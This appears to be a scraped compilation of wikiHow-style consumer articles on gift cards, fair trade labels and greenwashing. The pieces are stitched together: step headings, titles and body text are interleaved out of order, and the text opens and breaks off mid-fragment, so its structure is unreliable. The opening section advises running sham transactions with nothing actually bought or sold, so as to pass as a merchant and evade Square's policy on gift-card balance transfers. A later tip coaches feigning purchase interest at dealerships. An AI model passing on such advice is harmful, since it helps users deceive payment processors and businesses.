, Visa gift cards, along with the similar card from American Express, charge monthly fees just for having a balance. If you plan on spending or trying to get it into your bank account, do it quickly., This can be done either via the app, which is available for both iOS (iPhones/iPads) and Android, or via the website, www.squareup.com. You will need to enter:


Your name and email
The name of your business
The type of business
How you plan to use Square
Estimated annual revenue.
If you are not a business, you will still need to enter information for these fields.
Confirm your email address.

, Square will deposit the balance from your gift card or any other transactions into this bank account. This is not typically immediate, and it can take up to two business days according to Square's FAQs. This approach may not work if you need to make the transfer from the gift card quickly., Square charge different rates to users if you use the card reader or make a manual entry. A reader charges a lower fee of 2.75% versus the 3.5%+$0.15 transaction fee for a manual entry.You can buy Square readers at a store like Best Buy, order one from Square for $29.00, or borrow one from a friend. Multiple accounts can share the same reader.

, While Square indicates it accepts Visa gift cards, there are mixed reports that Square will reject a Visa gift card if it believes you are using the service once to transfer a balance. In order to avoid this, you need to convince Square that you are a regular merchant or find a friend that is an established merchant to make the transfer for you.


There is no guarantee this will work, but it will increase the likelihood of success.
You can skip this part and try to make the gift card transfer following the steps in the next part. Just be aware that it may fail.

, This is a transaction that you create and pay with your own funds or credit card. You are not actually buying or selling anything. This creates a transaction record in Square before trying to transfer the Visa gift card balance. It is recommended that you enter an amount in Square that is not too large since it charges a transaction fee. You will get this money back in the bank account that is linked to Square, it is not disappearing.

, You are not using the Visa gift card yet, so choose another card for this transaction. It does not matter what kind of card you use.

, This will make you appear more like a merchant and also serve as a test ahead of a the larger balance transfer.

, The transactions you have made are credited to your bank account within two business days. Square will charge transaction fees, so the amount transferred into your bank account will be the amounts you entered less the fees.

, The gift card will be authorized, the card's balance will fall to zero, and the funds will be deposited by Square into your bank account within one business day.


If Square does not allow the transfer, you will see a note that it is against their policy to transfer a Visa gift card balance. They will still charge the 3.5% or 2.75% fee to your bank account, and the balance will get credited back to the Visa gift card.

, It should take just one business day for the money to show up in your account. Allow an extra day if you made the charge later in the day, some banks also take time to process it. The transaction could show up as a pending deposit and may not have immediate availability. Check your bank's policies online or with your branch.


A bank's stated policy is typically the worst case scenario for your fund availability. It is often faster than the stated time frames.

, The Visa gift card should have a zero balance if you successfully transferred the funds. However, if Square rejected the transaction, you will need to check the balance and make sure the fund were returned to the Visa gift card.

Chart your emotions.,

Look for products that have a CarbonCounted logo on them.",How to Be a Considerate Consumer," Do you really need to buy it? Is it an essential item or a moment of weakness at seeing something glittery and interesting? Assess how much you are being influenced by current trends, billboard advertising and TV promotions. Has the ""need"" been planted in your head or are you really in need of it?;
, Is the item recycled or recyclable? Is it fair trade? These are two important considerations for reducing your consumption impact. If the item is new, it has taken considerable resources to create it. If it is recycled, or recyclable, it is part of the ever growing system of making better use of what we create and use.

, If you have the choice, go for the biodegradable, locally produced and less energy intensive choices. If you can find out how the item was produced, this should also have a bearing on your purchase - avoid items coming from countries that endorse sweatshops, child labor and under-paid employees.

, What new things do you really need? What existing things can you repair, improve upon with your own creativity or keep using as they are? Question why you are addicted to fashion trends and need to replace your wardrobe every new season. Be more fashion aware by buying items of clothing that endure frivolous fashion changes.

, Why not visit a thrift store or a used dealer and buy pre-loved items or reconditioned items? They will still do the job you seek and this reduces the need for more manufacturing and its subsequent polluting and amassing problems.

, Do not try to be a saint or a sinner. Be sensible and find the middle ground and make changes gradually and in as simple a way as possible. Those who evangelize about the environment, sustainable development or frugal ways of living are entitled to their beliefs but should not make pariahs of others who are their fellow human beings. By the same token, there is no way to absolve yourself of excessive consumption - there is no means of atonement through money, belief or self-justification. Rather, find the middle ground and be sensible and careful. Aim to think rationally and emotionally, so that you find the balance in your passionate pursuit of calmer, more sensitized consumption.

, If you use shopping as a way to feel better, it is a good idea to make a chart of the triggers. Learn to avoid them or to manage them differently. Also, look at your credit card bills after such a shopping expedition to ""cheer yourself up"" for a little lesson in reality.

, Put your money toward other pursuits in life, such as building a sustainable home, taking a vacation to an eco-resort or donating funds to worthy causes. Keep money aside to boost your retirement savings. Better gaining interest than dust in your home.

Look for fair trade stickers or symbols.,
Ascertain what organization issues the label.,
Research the organization's certification requirements.,
Find out how far down the supply chain the organization inspects.,
Understand the requirements for products with multiple ingredients.,
Consider the cost of inspection, certification, and licensing.,
Contact the company that produces or distributes the product.,
Review company and third-party reports.,
Find products and companies online.,
Look for labels on products, not retail shops.,
Speak with managers of your favorite stores.,
Buy local or direct where possible.",How to Research Fair Trade Claims," If an item has been certified by a third-party organization as produced under conditions that qualify as fair trade, it typically will display a sticker or symbol on its packaging.The labels you see will mean different things, and may mean nothing at all. A company may claim itself that its products are ""fair trade"" without any independent evaluation of this claim.
Keep in mind that there are no legally enforceable minimum standards you must meet to call your product ""fair trade,"" such as those that exist for certified organic products.
Labels or symbols indicate that a product has been certified as fair trade by a particular independent organization.;
, There is no universal or uniform body for evaluating the principals of fair trade, and different organizations have their own methods of evaluation and qualifications. There are three basic types of labeling organizations.Third party inspection and certification labeling organizations have the highest standards for fair trade. They typically conduct field inspections of growers or processing plants, and compare performance against a set of uniform standards.
Membership organizations such as the World Fair Trade Organization (WFTO) and the Fair Trade Federation (FTF) evaluate the fair trade polices and practice of whole companies using set membership criteria, but do not inspect growers and processing plants themselves.
Brand programs such as Whole Trade, the fair trade program for Whole Foods grocery stores, work with third-party inspectors and certify operations using their own brand standards regarding what qualifies as fair trade.

, Each organization has particular guidelines that must be met for products to be certified, including labor law and pricing standards.There are two basic certification standards that are generally recognized, and typically other organizations have some version of one of those, or a combination of both.The international Fair Trade Labeling Organization (FLO) is the oldest fair-trade certification body. The organization developed a number of verifiable indicators of fair trade practices, and are the best-known and most common certifier of agricultural products worldwide.
A number of Western countries such as Canada have their own fair trade initiatives which are affiliated with the FLO and use the same standards.
The Institute for Market Ecology (IMO), headquartered in Switzerland, is also a well-known and well-respected certifier of fair-trade and organic products.
The IMO aims to be more universally applicable than the FLO standards, which typically require producers to be large-scale co-ops or plantations with hired workers.
IMO standards, in contrast, allow distributors to purchase products from individual farmers, informal producer groups, and smaller collectives.

, The standards required by the labeling organization should extend to all actors involved in the trade of the product, and include not just employees but also contractors and sub-contractors.Label organizations that use FLO standards typically focus on the hired labor harvesting crops on plantations, with less focus on workers in processing, unless processing is organized by farmers' collectives.
In contrast, IMO certifiers evaluate the pay and working conditions of all workers involved in the process of bringing the product to market.
IMO certifiers also tend to include contract processors in their inspections, while FLO certifiers limit their evaluation to hired employees.

, Labeling organizations have different requirements – and different labels – to accompany products with several ingredients that are sourced from several producers.FLO certifiers require all ingredients to be certified for the final product to be certified. However, if certified ingredients are not available, at least 50 percent of the product must be fair-trade certified for the whole product to be granted a fair-trade label.
If fewer than half of the ingredients are fair-trade certified, the product may carry a label on the front of the package indicating that it is made with a single fair-trade ingredient, or with a few fair-trade ingredients.
Keep in mind that these ""fair trade lite"" labels often look exactly like the whole fair-trade certified labels, so with multi-ingredient products you must inspect the label closely.
In contrast, IMO ""fair trade lite"" labels may only be carried on the back of the packaging – only whole-product fair-trade labels may be displayed on the front.

, Inspections for fair-trade certifications typically take around six months to complete, and labeling organizations charge fees for the inspection and licensing process that some companies cannot afford.FLO organizations charge inspection fees to producer groups and processors, plus licensing fees for the use of the logo to brands that sell FLO-certified products.
IMO organizations charge inspection and certification fees, but do not charge licensing fees to brands that sell fair-trade certified products.
The costs of inspection, certification, and licensing may be prohibitive to smaller companies selling items that actually are produced in sustainable ways with workers in fair working conditions being paid a living wage.
Additionally, it requires many months of research and analysis for fair-trade organizations to determine fair prices for new crops or products.
Although the FLO has a quick-entry program for new products that may fall within existing standards for other products, the organization still must analyze local market conditions to confirm the price is fair.
In many cases, although producers or artisans may be paid a living wage, there simply isn't a certification system in place to evaluate the fair-trade standards for that particular product yet.

, If you have questions about how a product is produced or where it comes from and there's no label to assist you, the company may be able to provide some answers.Smaller companies and those that sell products produced by individual farmers or informal collectives may not have the funds or ability to have the products they sell fair-trade certified.
Many such companies often have pages on their websites that describe how their products are made and the conditions of the workers who harvest and process them.
You also may be able to find answers by calling the company's customer service number and asking about worker conditions. Ask what criteria the company uses to choose its suppliers, and how they verify working conditions and wages for the people who produce the products they sell.
Producer organizations that trade directly with nonprofit organizations or other retail collectives may not be certified fair trade, but nevertheless achieve the same goals of finding solutions to poverty and empowering people in developing countries.

, Even if they aren't certified, many companies issue statements on the production standards of the items they sell. Nonprofit organizations such as Oxfam America also investigate and report on global labor and working conditions.Smaller suppliers or collectives may not themselves be certified, but may operate under the same criteria as a larger supplier nearby.
Many nonprofits such as Catholic Relief Services have their own criteria to determine whether producers, artisans, and other partners follow fair trade principals and promote sustainable economic growth.
Keep in mind that fair trade certification often doesn't apply to goods produced in Western countries, only those imported from the developing world.

, A number of nonprofit organizations as well as fair-trade labeling organizations have lists available online of products that are certified fair trade. Many fair-trade products distributed globally by smaller companies are only sold online.Websites such as fairtradefederation.org and transfairusa.org have lists of products and producers that are certified fair trade.
If you're looking for fair-trade clothing, participating brands are more likely to be sold online than in brick-and-mortar stores.
You also may be able to find better prices online if you buy directly from the company than if you purchase fair-trade products at a grocery store or other retail shop.

, Retailers may include a fair-trade label on their doors or on the front page of their website for marketing reasons. However, these labels don't guarantee that most – or even any – of that retailer's products are certified fair trade.Keep in mind that stores may continue to display a fair trade lego even though they no longer sell fair trade products. Similarly, stores may express a commitment to fair trade without actually selling certified products.
Even if a store does sell fair-trade products, a logo doesn't mean that everything that store sells is fair trade. You still must verify from the product's packaging that each particular item was produced under fair-trade standards.

, If you want to see fair-trade products in your favorite store, fill out a comment card or speak directly to management and make your desires known.Keep in mind that a single voice may not be enough for a manager to start carrying a new product. Talk to your friends who also shop at that store, or circulate a petition in your community to demonstrate demand for fair-trade products.
If the store is a chain, individual managers may not have much control over the products they carry. However, you can start a petition online and drum up support using social media to encourage the company to start carrying fair-trade products.

, If you're concerned about fair trade, buying the products you want or need directly from the artisans and growers provides the strongest assurance that everyone is being compensated fairly.Buy produce in season, and shop at your local farmer's market, rather than buying produce in the grocery store that was imported from developing countries.
Connect with nonprofit organizations to buy clothing and housewares that are hand-made by artisans who are paid directly for the goods they produce.
Find out if there's a co-op or other collective in your area that you can join to purchase locally sourced products from individual growers.

Repurpose: When we find a new use for an old thing, rather than just throwing it away, we’re keeping it out of a landfill and also cutting costs.,
Recycle: If your town has a recycling program, participate!,
Hand-Down: Small children don’t stay small for long, so they typically outgrow their clothes before they wear them out so consider reusing them for the next child.,
Plant a garden and put a dent in your summer grocery bill, reduce your carbon footprint, and make the world a little greener — literally.,
Buy from a local farm or farmer’s market if you don’t have a green thumb, but still want to be green.

",How to Be Green While Saving Green Like the Amish," Craker suggests:


turning old clothing into a quilt or rags;
saving empty plastic jars, egg cartons, and fabric scraps for kids’ craft projects;
repurposing old cans in your garden.;
, But also consider recycling yourself:


use old cans or glass jars to store nails, screws, and other odds and ends;
clean out plastic containers to reuse for food storage.
One thrifty/green secret Craker shares in her book, thanks to a reader’s tip: take old jeans and make them into pillow covers, using the pocket to hold a tooth for the tooth fairy!

, Most Amish families have at least half a dozen kids, so they naturally clothe the younger ones with hand-me-downs. If your family is slightly smaller, find other families you can trade with, or at the very least, donate used clothing to charity instead of them hitting the landfill.

, For example, Craker interviewed Ella Yoder, a fabulously thrifty Amish woman, who among other things uses gallon metal apple butter cans (minus both ends) as seedling protectors in her garden.

Get in and purchase your items as soon as possible.,
Check the terms.,
Get advice.,
Don't get your hopes up too high.",How to Redeem Vouchers or Goods Owing to You When a Store Closes or Goes Bankrupt," When voluntary administration is in place, all the old rules change. The company may no longer owe anything to you, dependent on the rules in your jurisdiction. But if the company does announce that it will honor items such as gift vouchers, get there swiftly to redeem them.;
, There may be lots of conditions placed on redeeming gift vouchers, credit, lay-aways, lay-bys or unused services, etc. If the company says it will only honor vouchers to the value of half their worth or will only provide the services to the first 100 customers, heed what you're told and do your best to try to meet the new conditions so that you at least get something back.

, If you are owed a considerable amount, it's a good idea to talk to someone in the store who deals with the financial policies. If that's not possible, talk to someone in the Consumer Affairs department of your government or get legal advice.

, Even if the company trades through its difficulties or is purchased by a new company, the old rules and policies governing the store's running will probably be long gone and that may well include the redemption of vouchers, etc. Keep well informed as to what is happening by reading the store's website and checking updates through social media and local news sources.

Use a gift card market site.,
List the gift card on a user-driven site.,
Avoid eBay and other consumer sites.",How to Sell or Swap Gift Cards1," There are sites online that allow you to swap and sell gift cards, known as gift card marketplaces. These sites offer a balance guarantee on any card purchased or sold through them. This ensures you are not scammed or given an unfair price for the gift card. They work as the middleman between buyers and sellers so you only deal with the company and not with any third parties.There are several popular gift card market sites online, including Cardpool and CardCash.
Cardpool offers up to 92 percent of the card’s value when you sell cards through them. You will get a mailed check or an Amazon gift card for any gift cards you sell through the site.
CardCash gives you up to 92 percent of the gift card’s value when you sell through their site. You can sell physical and electronic gift cards on the site and you can trade cards for other gift cards or get cash for the card.;
, You can also try a user-drive site that allows you to sell gift cards to buyers similar to eBay, but with less risk. You can list your gift cards on the site and set a price of your choosing. Then, buyers will purchase the cards directly from you. You will need to verify your gift card with the user-driven site before you can list it for sale.As a seller, listing the gift cards on a user-driven site will allow you to sell it for at least 92 percent of its value. Some sites take a 15 percent cut of any cards you sell.
Raise is a popular user-driven site for selling and buying gift cards.

, Be wary of using sites like eBay or online classifieds sites like Craigslist to sell or swap gift cards. Though you have complete control over pricing and selling the cards, you have no guarantee that the buyer is legitimate. There is a lot more risk involved in using these sites and you may end up getting scammed for the card or receive no payment for it.Keep in mind a gift card is only one step away from cash and this means they are good targets for scammers or buyers who want to rip off sellers.
You may end up selling a gift card to a buyer, for example, who then uses up the amount right away and claims that as the buyer, you did not sell the card “as described.” You may then end up having to refund the gift card amount to the buyer.

Re-gift general gift cards.,
Buffer your expenses with gift cards.,
Economize by using gift cards on sale items.,
Pair gift card purchases with coupons.,
Add gift card money to returns to buy more expensive items.,
Get double or extras whenever possible with gift cards.",How to Make the Most of Gift Cards1," You can save yourself the expense of having to buy another gift for a birthday, holiday, and so on by re-gifting your gift card. Earn extra points with the recipient of the card by prioritizing cards for stores they shop at often.


For example, if you need to buy a present for a friend who's interested in design, you might give that person a gift card from Bed Bath & Beyond, Kohl's, or Pottery Barn.
You may want to avoid re-gifting any gift cards that have your name written or engraved on them.;
, Save your gift cards up for expensive or lean times of the year. Many gift cards endorsed by major networks, like Visa, Mastercard, American Express, and so on, can even be used for paying bills.Major network endorsed cards can sometimes be used to add to the balance of some online accounts, like Amazon or PayPal., Gift cards can almost always be used on sale items. By waiting for an item you want to go on sale, you can stretch the value of your gift card. After major holidays and when items are out of season (like winter clothes in spring), are common sale times.You might coordinate your gift card shopping by doing an online keyword search for ""best time of the year to buy "" as in ""best time of the year to buy winter clothes/electronics/etc.""

, You don't have to waste time cutting out physical coupons from the newspaper or magazines, though these can be combined with gift card purchases to save your gift card balance, too. Electronic coupons or rebates paired with your gift card purchases can make your card balance last longer than it would have otherwise.If you don't have a coupon but have found an item you plan on purchasing with a gift card, take a quick moment to check online for ""coupons, discounts, or rebates for "".Unless a coupon specifically says ""online only,"" the store is legally obligated to honor the coupon or coupon code., You can boost the purchasing power of your gift card by adding money or credit you've earned back for a returned item to it. If you receive a gift you don't like, return it and combine the return money with your gift card to buy things outside of the range of your gift card balance., Frequently, stores will run special buy one get one free or two for one deals. These are an excellent investment for your gift cards. Even if you don't need an extra of whatever item you are buying, you could always re-gift the second item, sell it on an online marketplace, like Amazon or Ebay, and so on.


Online sellers and overstock sites are common places you'll find buy one get one and two for one deals."

Define your mission and values.,
Be specific.,
Don’t lie by omission.,
Don't exaggerate product details.,
Avoid making general claims.,
Be transparent.",How to Avoid Greenwashing1," When you develop your business, don’t overlook creating a mission statement that will guide your future entrepreneurial endeavors. Consider your values, your goals, your boundaries, and your overall mission. Be intentional with your word choices, fully embracing the meaning of each word, so that your mission is one which you can stand behind.Your mission and values may change over time, which is perfectly normal. If you find that your needs or goals change, or your understanding of your company’s green promises, you might need to revise your mission statement.
If your understanding of terminology changes, be proactive and change your mission statement accordingly right away.;
, Specificity in your descriptions will ensure that you’re intentionally using words and phrases. Because of that specificity, you’ll necessarily need to understand exactly what you’re saying when you use phrases and terminology, and because of that, you’re much less likely to greenwash.Also, specificity is helpful in sales because you can clearly and pointedly articulate specific benefits to using your services or products.

, One common way of greenwashing is to highlight one green characteristic or feature of a product or service and disregard its other qualities. At its worst, rather than just not giving attention to these other qualities, some greenwashed businesses will intentionally avoid them.For example, you might point out that your machines are energy efficient, but fail to talk about the dangerous chemicals required to make the machine function properly.

, Greenwashing can also occur in the form of exaggerated product qualities. Be sure to represent the green qualities of your products as they are, not as a higher percentage or greater extent. For example, unless your product really is made of 100 percent recycled materials, don't claim that it is. Exaggerating one claim may also make consumers suspect of other claims you make, regardless of whether or not the other claims are true., Be wary of general claims like “environmental preferability,” “environmentally friendly,” or “Earth smart.” These don’t provide purchasers with any specific information that can be used to compare products. Such claims are meaningless unless there is an accompanying explanation of what, exactly, this entails., Your company should be willing, if it’s able to back up its green claims, to compare products side-by-side with others, not hide any data, and be open to business and customer scrutiny. This shows that you’ve nothing to hide, and also shows that you haven’t inflated your claims."

Follow companies.,
Follow deal hunters.",How to Get Free Amazon / iTunes / eBay Gift Cards1," Use services such as Twitter and Facebook to follow companies that you shop at. Occasionally, these companies may hold contests where a certain number of people that “Like” or retweet something receives a complimentary gift card.;
, Twitter and Facebook are full of professional deal-hunters. These people and organizations track down deals and broadcast them to their followers. These deals can sometimes take the form of gift cards.


Search Twitter and Facebook for ""deals"", ""bargains"", ""deal hunters"", ""gift cards"", etc. There may be deal hunters that specialize in your city, as well as hunters that track specific services such as Amazon.

Visit any participating merchant that sells Visa gift cards.,
Purchase a Visa gift card from an online source.,
Track your Visa gift card's remaining balance by calling the phone number or visiting the website listed on the back of the card.",How to Get a Visa Gift Card," Some popular merchants include:


Transit companies, such as Greyhound;
Banks, such as Wells Fargo;
Grocery stores, such as Safeway;
General retailers, such as Target, Kmart and Walmart;
Specialty stores, such as Office Depot and Nordstrom.;
, Keep in mind that you can't use the card until it's physically shipped to you.


Reputable online sources for Visa gift cards include banks and credit unions such as Chase, Navy Federal Credit Union, PNC Bank and Wells Fargo; card centers such as GiftCards.com, Give Card and Gift Card Mall; and money wiring service providers such as Western Union.
Use your Visa gift card anywhere Visa debit and credit cards are accepted.
Your Visa gift card allows access to the prepaid funds only and does not represent a line of credit. Because of this, attempts to authorize more than the card's remaining balance will be denied. This can cause problems at merchants, such as gas stations, which may authorize more than the actual purchase being made.

,


Some merchants, such as Barnes & Noble, Target and Dillard's can check your remaining Visa gift card balance when you make a purchase.

Arrange a gift card swap.,
Talk to friends and family about selling gift cards to them.,
Come up with a fair price for the gift cards.",How to Sell or Swap Gift Cards2," If you’d prefer to swap the gift cards among people you know, you can arrange a gift card swap. This could be an informal gathering at your home where you invite friends and family over to swap gift cards they no longer want or have not yet used. Have everyone write down the dollar amount of their gift cards and swap amongst themselves.


Another option is to set up the gift card swap like an auction, where people bid on different gift cards or offer to swap their gift cards for someone else’s gift cards.
You can have people offer several gift cards for the price of one card as part of the swapping rules. This may be important if the gift card someone wants is to a more desirable place than the cards they have and want to swap up.

, You can also work as your own private seller and speak to family or friends about selling your gift cards to them. Create a list of gift cards you are selling and circulate the list to family or friends via email. Or visit family and friends to try to sell gift cards you think they might want.


For example, perhaps you have a friend who loves to online shop on Amazon. You can then try to sell any Amazon gift cards you may have to them.

, When you sell the gift cards on your own, you will need to determine how much you want to charge for them. Perhaps you give buyers a discounted rate as an incentive to buy them from you, such as 10% off the amount on the card as the selling price. Or maybe you offer buyers a deal if they buy more than one gift card from you.


If you received the gift cards for free as a gift, you can offer to charge buyers the amount on the gift card as the selling price. This way, you do not lose out on any money and still get cash for the gift card.

Contact the retailer about their return policy.,
Determine if you can return the gift card for cash.,
Discuss other return options with the retailer.",How to Sell or Swap Gift Cards3," If you do not want to sell or swap the gift card to buyers, you can try selling the gift card back to the retailer. Call the retailer and ask them if they have a return policy for gift cards. Depending on the retailer, you may be able to arrange a return of an unused gift card purchased within a certain period.For example, the retailer may have a policy where they allow returns on gift cards purchased within 10 days.
You may have more luck returning a gift card to a third party retailer, such as a grocery store. They often have a return policy in place for gift cards.

, Ask the retailer if they are able to return the gift card for the cash. If you have a relationship with the retailer and are known to be a good customer, you may be able to arrange for a cash refund for the gift card. This may be more of an option with local retailers or smaller retailers.For example, you can say to the retailer, “I have been a loyal customer for years now. Would it be possible to get cash for this unused gift card? I ended up getting one as a gift and would prefer the cash.”

, If the retailer does not offer cash refunds for gift cards, you can try to get a refund using the original form of payment. For example, if the gift card was bought with a friend’s credit card, the retailer may be able to refund the amount back onto their credit card. Speak to the retailer about your options and see if you can work out an arrangement so you still get money back for the gift card.For example, you can say to the retailer, “Is it possible for me to refund the gift card on the original form of payment?” or “What are my other return options for the gift card?”
Keep in mind if you choose this return option, you will need the person who bought you the gift card to supply the original form of payment to get the refund. This could be an awkward conversation to have with the person who got you the gift card as a gift, so be prepared and tell the person that while you appreciate the gift card from them, you'd prefer to buy something else for yourself with the money.

Research gift card exchange sites and services.,
Compare exchange rates before selling.,
Save gift cards with unfavorable exchange rates.,
Keep personalized gift cards for yourself.",How to Make the Most of Gift Cards2," You'll want at least a few reliable sites on which you can exchange your gift card for cash. This will help you get the most money from your exchange. Some popular gift card resale sites include:


GiftCards.com
CardPool.com
GiftCardRescue.com
MonsterGiftCard.com, Some sites offer a more favorable exchange rate for certain gift cards over others. Because of this, you should always comparatively shop around before selling your gift card. You may get a better exchange rate, and more cash, for selling the same card on a different site.Some online services check several sites to find the best deals, or in some cases you may be able to set alerts for certain gift cards you want. Use these services and alerts to get the most out of your gift cards.

, After checking a few different gift card resale sites, you may have found that you're losing more money on the sale of the gift card than you're comfortable. If you're in this situation, you might want to keep the card until the exchange rate is more favorable.


If, after a while, you notice the exchange rate stays unfavorable, you might try exchanging gift cards with a friend for an equal value one usable at a store you frequent.
There are card exchange sites, where you can swap your card for other cards. Two such sites are CardAvenue.com and GiftCardGranny.com., Gift cards that have your name engraved or written on them are often times impossible to exchange for money. In these cases, you should keep the gift card for yourself.Even if your gift card is personalized, you can still use it to buy presents, to pay for bills, and so on.

Keep gift cards in an easily noticeable place.,
Go digital with your cards.,
Protect yourself from fraud or illegal fees.,
Choose between closed and open loop cards.",How to Make the Most of Gift Cards3," You might be tempted to hide your gift cards away in a sock drawer for a rainy day or an item you really want, but by doing so you might forget about the card. You might want to keep gift cards in a special sleeve or compartment of your purse or wallet so that you're less likely to forget about them.Millennials are twice as likely to lose gift cards.If you're in this age group, you may want to be extra careful about where you keep your gift cards.

, More and more these days, digital equivalent of physical products, like gift cards, are available. Digital gift cards are usually linked to an account or email and most are accessible with your cell phone, so these are harder to lose. Be sure you enter the recipient's information (like name and address) correctly. Otherwise, they might not get it.In some cases, recipients might mistake your e-gift card for spam. To prevent this from happening, you might want to say something like, ""I wanted to get you this e-gift card. I'll be sending it, so keep an eye out for it."", To help prevent dishonesty and fraud, laws were pass in 2009 in the USA for gift card fees and expiration. If you live outside the US, your home country might have similar laws in place. Track your balance on your card and fight unfair fees and premature card cancellations. Generally, in the US, where gift card fees and cancellations are concerned:


All cards must be valid for at least five years. Any money added to the card must be valid for a full five years starting from the date it was added to the card.
In most cases, issuing companies cannot charge service fees and so on to the card in the first year after its purchase. However, you may be charged an initial fee or a fee for card replacement, should it be stolen or lost.
Following the first year after the card's purchase, card fees from the issuing company are limited to one fee per month., Closed loop cards are only valid for a specific retailer or retailer group. Open loop cards are general, network-branded cards that you can use wherever the network is accepted. Both closed and open loop cards have upsides and downsides:


Closed loop cards, in most cases, have no fees. However, if a retailer doesn't have convenient locations nearby or an online store, these can be inconvenient. Also, if the retailer closes, your card could become worthless.Open loop cards are frequently stamped with a major card network, like Visa, Mastercard, American Express, and so on. Expect to pay a fee to purchase the card, and potentially more fees a year after purchasing it."

Know what you’re talking about.,
Be wary of irrelevant “Green” facts associated with products.,
Beware of the lesser of two evils.,
Distinguish between green and sustainable.",How to Avoid Greenwashing2," As a consumer, it’s important that you are familiar with terminology associated with the business or product that you’re looking at purchasing. You may be familiar with the lingo that promotes green technology, such as carbon neutral or low emission, but don’t decide on a product until you're fully aware of what these terms mean. You need to understand their definitions and implications so that you don’t inadvertently buy a misrepresented product.As a consumer, you should also feel free to ask for transparency. If a company isn’t willing or is unable to provide data about their business, opt for a company that will.

, For example, products claiming to be CFC-free (containing no chlorofluorocarbons which are harmful to our ozone layer), even though CFCs were banned altogether 20-some years ago. Think of this as a smoke and mirrors technique.Look into claims that a product or vendor makes. If one claim stands out in particular from others, this might be a sign that you’re wrestling with an irrelevant fact.
As a consumer, you must be diligent in asking questions about a product’s overall environmental impact. For whatever product or service you’re looking to purchase, consider making a short list of questions that you’ll ask every vendor., This happens when a true environmental claim is made, such as recycled, environmentally friendly, or natural, which distracts your customer from the more problematic, overall issue with the product.This is commonly found in contradictory product combinations such as organic cigarettes or “environmentally friendly” pesticides.
As a consumer, you’ll do well to consider the larger, overall implications and repercussions of the product or service that you’re looking at. If you’re concerned about honeybees, for example, herbicides, no matter what claims are made about them, may just not be something you want to look at.

, Sustainable products are positive in the sustainability tripod: environmental health, economic vitality, and social justice. They focus on all three areas, how the three areas interact, and aim to reduce ecological footprints. Green products, on the other hand, only focus on one of the three areas of the sustainability tripod."

Look for Green Certification from reputable industry organizations.,
Look up certifications.,
Identify the original manufacturer and/or reseller.,
Take advantage of the Greenwashing Index.,
Create report cards.",How to Avoid Greenwashing3," These are designed to send a market signal to buyers that the products they purchase are derived from resources that are managed to particular environmental and social standards. Some of the most widely recognized organizations to reference are: EcoLogo, Energy Star, the Forest Stewardship Council, Green Seal, U.S. Federal Trade Commission, Leadership in Energy and Environmental Design (LEED) and U.S. Green Building Council (USGBC)., Some greenwashers  have been known to invent their own certifications, then tout their products as green based on those fake certifications. Be diligent and research the certifications. If they aren’t real, stay far away from this vendor., The term original design manufacturer (ODM) is used to describe companies that design and manufacture a product and is used to refer only to the original manufacturer of the product. The term value added reseller (VAR) is used to describe the reseller of ODM products. Sometimes a VAR might say they are going to offer a new, ODM product, meaning they are going to offer a new product based on components from an original manufacturer. However, this somewhat complex web allows the reseller to position themselves to be the product’s manufacturer.Start by determining if the manufacturer is the original (ODM) producer or simply a reseller (VAR). A reseller can pass responsibility off to the manufacturer, skirting uncomfortable scrutiny. Also, a reseller can claim they are a manufacturer, when they aren’t. This is problematic because they won’t have transparency or full understanding of the product about which they are making claims.
As a consumer, figuring out if a company is a manufacturer or reseller may be difficult, if not impossible. There isn’t a national registry of manufacturers, so you might need to rely on tax records to trace a product back to its parent company.

, The Greenwashing Index was developed by EnviroMedia Social Marketing and the University of Oregon and allows people to upload ads and then rate them on a variety of criteria. This groupthink approach is helpful because it offers a variety of perspectives about the overall truthfulness of the ad as well as its approaches and promises.This index is beneficial in helping you vet your vendors and also helps to ensure that you’re not greenwashing your own ads.

, You need to be diligent in all of your advertising, communications, and product representations, and a good way to do this is with report cards. These are an excellent way to monitor your vendors as well. They should be transparent, and grading them on their truthfulness and green products should not be problematic.If a vendor gets a low or failing mark on your report card, especially if they previously received high marks, talk over your issues and encourage them to make positive changes.
If they refuse to make positive changes, find a new vendor.

Create a new email account.,
Sign up for a rewards program.,
Look for other ways to earn points that don’t directly involve paying money.",How to Get Free Amazon / iTunes / eBay Gift Cards2," An online rewards program can reward you with gift cards in the long run, but they generate a significant amount of marketing email and spam. This is how they afford to give out gift cards. Create an email address specifically for the rewards program to keep your personal inbox spam-free.


Do not give any of the companies your credit card number, as there are numerous ways to earn points that do not require purchases.

, These programs will send you marketing email with offers that can earn you points. These are often surveys and special purchases through specific retailers. Some of the most popular rewards programs include:


MyPoints
SwagBucks
My Coke Rewards
QuickRewards
Free E-bay Gift Card (Check the last link of source)

, These can include playing games, watching advertisements, and filling out surveys. These activities often net you fewer points than purchases, but they are free.


You may need to make big purchases in order to earn enough points for a gift card. Try to make purchases that you would normally make at another store to keep the cost of the gift card down. Making extra purchases just to receive the gift card will defeat the purpose.
Members are usually given the opportunity to sign up with program sponsors for products or services; you do not have to accept in order to become a member or to earn points towards future free gift cards.

Create a Gather account.,
Write your articles.,
Redeem your points.",How to Get Free Amazon / iTunes / eBay Gift Cards3," This program allows members to earn points by writing articles about topics of their choice, uploading pictures or videos, and by commenting on other member articles.


Topics for articles, pictures, and videos are decided upon entirely by the author. There are numerous groups that members may join to discuss topics with members who have similar interests.

, The more people that read your articles, the more points you will earn. Write quality articles to help you stand out and draw readers to your work.


Be aware that you will have to put a significant amount of time in writing articles before you see good rewards. You may be better off writing for profit on another website so that you can earn actual money for your work.

, Once the designated number of points have been earned, you can redeem their points for free gift cards from a number of businesses, including Amazon.


Gather also offers a direct payment to PayPal, from which members can then purchase gift cards from iTunes or eBay.

Download a mobile rewards app.,
Earn points by engaging in marketing.",How to Get Free Amazon / iTunes / eBay Gift Cards4," These programs are similar to website-based online programs, though are targeted specifically towards mobile users. Some examples include:


MobileRewards
e-Rewards Mobile
JunoWallet

, Most mobile rewards programs will ask you to download other apps and games that advertise through the program. There are also often surveys that can be completed.


Be careful when purchasing apps for reward points. Each app may not seem like it costs that much, but a lot of small purchases can add up quickly.

Donate blood.,
Test drive a car.,
Transfer your prescriptions to a new pharmacy.",How to Get Free Amazon / iTunes / eBay Gift Cards5," Red Cross will occasionally promote blood drives by raffling or giving away gift cards. Contact your local Red Cross and find out if a drive near you is happening soon.

, Dealerships will sometimes run promotions that give gift cards when you take a car out for a test drive. Contact dealerships in your area and find out if they are doing any test drive promotions.


Carry yourself like you want to buy. You are much more likely to be allowed to test drive if you act like you’re interested in buying a car. Don’t mention the gift cards up front.

, Large chain pharmacies will often offer rewards for transferring your prescriptions to them. These usually come in the form of a $25 gift card for that store.

Ask if you can use the card anywhere.,
